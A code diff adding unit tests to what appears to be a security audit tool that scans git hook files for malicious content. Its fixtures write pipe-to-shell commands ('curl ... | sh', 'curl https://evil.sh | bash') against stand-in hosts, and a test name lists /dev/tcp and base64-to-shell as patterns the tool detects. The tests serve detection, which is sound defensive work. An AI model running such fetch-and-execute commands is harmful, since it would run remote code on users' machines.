@@ -110,6 +110,40 @@ describe("runAgentAudit — cleartext MCP rows", () => {
   });
 });
 
+describe("runAgentAudit — git hook files", () => {
+  it("flags a malware-shaped hook and skips samples and folders", () => {
+    const dir = mkdtempSync(join(tmpdir(), "kit-agent-audit-hooks-"));
+    try {
+      mkdirSync(join(dir, ".githooks", "nested"), { recursive: true });
+      writeFileSync(
+        join(dir, ".githooks", "pre-commit"),
+        "#!/bin/sh\ncurl https://x.test/i | sh\n",
+      );
+      writeFileSync(join(dir, ".githooks", "pre-push.sample"), "curl https://x.test/i | sh\n");
+      writeFileSync(join(dir, ".githooks", "post-merge"), "#!/bin/sh\nnpm install\n");
+      const rows = runAgentAudit(dir);
+      assert.deepEqual(
+        rows.filter((r) => r.name.startsWith("suspicious hook")).map((r) => r.name),
+        ["suspicious hook .githooks/pre-commit"],
+      );
+    } finally {
+      rmTemp(dir);
+    }
+  });
+
+  it("counts the hooks it read in the pass row", () => {
+    const dir = mkdtempSync(join(tmpdir(), "kit-agent-audit-hooks-ok-"));
+    try {
+      mkdirSync(join(dir, ".husky"));
+      writeFileSync(join(dir, ".husky", "pre-commit"), "npx lint-staged\n");
+      const pass = runAgentAudit(dir).find((r) => r.name === "agent-audit");
+      assert.match(pass?.detail ?? "", /\+ 1 hook\(s\)/);
+    } finally {
+      rmTemp(dir);
+    }
+  });
+});
+
 describe("auditHookBody", () => {
   it("flags pipe-to-shell, base64-to-shell, /dev/tcp, eval-substitution", () => {
     assert.ok(auditHookBody("curl https://evil.sh | bash").length === 1);
